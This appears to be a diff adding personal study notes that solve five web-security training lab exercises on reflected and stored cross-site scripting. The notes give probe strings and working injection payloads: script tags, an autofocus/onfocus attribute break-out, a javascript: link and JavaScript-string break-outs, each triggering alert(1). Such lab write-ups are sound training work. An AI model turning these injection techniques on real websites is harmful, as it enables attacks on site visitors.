@@ -1,0 +1,42 @@
+=> Lab: Reflected XSS into HTML context with nothing encoded in search functionality | URL: https://0af500bf037e28ff809f12a300b50033.web-security-academy.net/?search=
+1. first try this payload to see what chars get reflected => mr7'"<>/ => ?search=mr7'"<>/
+	``` all chars reflected on the page there is no sanitization and validation
+2. so we will use this payload directly :<script>alert(1)</script> => /?search=<script>alert(1)<%2Fscript>
+	``` it worked and alert triggered
+===========================================================
+
+=> Lab: Stored XSS into HTML context with nothing encoded in comment filed 
+1. go to URL: https://0a9b003b045ee7cb80e03044006500fb.web-security-academy.net/
+2. for any post click "View post" button URL: https://0a9b003b045ee7cb80e03044006500fb.web-security-academy.net/post?postId=6
+3. fill in form data and for comment section enter this payload for testin mr7'"<>/
+4. aftert submiting form click on "Back to blog"
+5. examine the data we entered and notice page source we see that comment section data refelcted in p tag without sanitization and validation => <p>mr7'"<>/</p>
+6. view post again and fill comment section with this payload :<script>alert(1)</script>
+7. aftert submiting form  and filled comment section with PoC payload click on "Back to blog" alert triggered and get a sotred XSS
+============================================================
+
+=> Lab: Reflected XSS into attribute with angle brackets HTML-encoded
+1. go to URL: https://0a46004904ec917b88c0610b0090006c.web-security-academy.net/
+2. in search input enter :mr7'"<>/ for reflection testing
+3. view page source and notice that out testing value relected inside h1 tag and inside value attribute of input tag
+	''' in h1 tag <>'" are HTML encoded mr7&apos;&quot;&lt;&gt;/ but in vlaue atrr only <> get encoded {value="mr7'"&lt;&gt;/"}
+4. enter this payload in search input mr7" autofocus onfocus="alert(1) you will get an alert
+============================================================
+
+=> Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+1. go to URL: https://0a310083032b6a59809303e8009200f3.web-security-academy.net/
+2. or any post click "View post" button URL: https://0a9b003b045ee7cb80e03044006500fb.web-security-academy.net/post?postId=6
+3. fill in form data and for comment section enter this payload for testin mr7'"<>/ and for name input enter this payload mr8'"<>/ for testing
+4.click "Post comment" to submit the form and click "Back to blog" to return to the blog and examine source page
+	``` name and comment filed are HTML encoded danguros chars so they are safe
+	``` but website input is refleted into href attr of anchor tage 
+5. view post again and fill website input with this payload javascript:alert(1)
+6. click on the link in the comments and you get the alert
+============================================================
+
+=> Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+1. go to URL: https://0aa4002b04e0e7dd80e04e3900be001b.web-security-academy.net/
+2. in search input enter the following testing payload mr7'"<>
+3. examine the source page and search for the testing payload where it is reflected ?
+	``` it relfected in a JS string value
+4. enter the following payload into search input '-alert(1)-' or ' ;alert(1);// you will get the alert
